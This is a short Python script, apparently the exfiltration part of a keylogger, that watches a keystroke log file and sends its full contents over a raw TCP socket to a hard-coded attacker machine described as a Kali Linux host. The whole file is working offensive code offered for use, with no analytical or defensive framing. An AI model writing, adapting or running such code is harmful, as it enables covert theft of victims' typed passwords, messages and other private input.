import os
import time
import socket

KALI_IP = "192.168.1.66"  # Replace with your Kali Linux IP
PORT = 5555                # Port to send logs to
LOG_FILE = "/var/log/keystroke.log"  # Path to the keylogger log file

def send_logs(logfile):
    """Send log data to the Kali machine."""
    try:
        with open(logfile, "rb") as f:
            data = f.read()
        if data:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((KALI_IP, PORT))
            s.sendall(data)
            s.close()
    except Exception as e:
        print(f"Error sending logs: {e}")

def monitor_log_file():
    """Monitor the log file and send updates when it changes."""
    last_size = 0
    while True:
        try:
            current_size = os.path.getsize(LOG_FILE)
            if current_size > last_size:
                send_logs(LOG_FILE)
                last_size = current_size
            time.sleep(2)
        except Exception as e:
            print(f"Error monitoring log file: {e}")
            time.sleep(5)

if __name__ == "__main__":
    monitor_log_file()